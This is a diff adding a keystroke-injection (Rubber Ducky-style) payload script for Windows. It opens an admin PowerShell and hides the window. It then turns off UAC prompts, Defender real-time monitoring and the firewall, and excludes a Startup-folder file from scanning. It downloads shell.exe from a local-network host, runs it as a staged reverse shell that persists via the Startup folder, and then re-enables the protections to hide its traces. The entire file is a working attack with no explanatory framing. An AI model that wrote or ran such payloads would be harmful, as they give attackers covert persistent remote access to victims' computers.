@@ -1,0 +1,73 @@
+REM |=== Start PowerShell as admin ===|
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 6000
+ALT Y
+ENTER
+
+REM |=== Hide PowerShell Window ===|
+DELAY 2000
+ALT SPACE 
+DELAY 1000
+STRING m 
+DELAY 1000
+DOWNARROW
+REPEAT 100
+ENTER
+
+REM |=== Disabling the UAC ===|
+DELAY 2000
+STRING Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+ENTER
+DELAY 100
+
+REM |=== Disabling the Real Time Monitoring ===|
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER 
+DELAY 100
+
+REM |=== Disabling the Firewall ===|
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 100
+
+REM |=== Add Exclusion Path Windows Defender ===|
+STRING Set-MpPreference -ExclusionPath "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"
+ENTER
+DELAY 100
+STRING $shell = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe"
+ENTER
+DELAY 100
+STRING Invoke-WebRequest -uri http://192.168.5.136:8000/shell.exe -outfile $shell
+ENTER
+DELAY 200
+
+
+REM |=== Run .exe and set up Staged TCP reverse shell ===|
+STRING start $shell
+ENTER
+DELAY 100
+
+REM | ============ Clear Path ========|
+
+REM |===Enable the UAC===|
+STRING Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 1
+ENTER
+DELAY 200
+
+REM |===Enable the Real Time Monitoring===|
+STRING Set-MpPreference -DisableRealtimeMonitoring $false
+ENTER 
+DELAY 100
+
+REM |===Enalbe the Firewall===|
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled true
+ENTER
+DELAY 100
+
+REM |=== Close the terminal window ===|
+STRING exit
+Enter
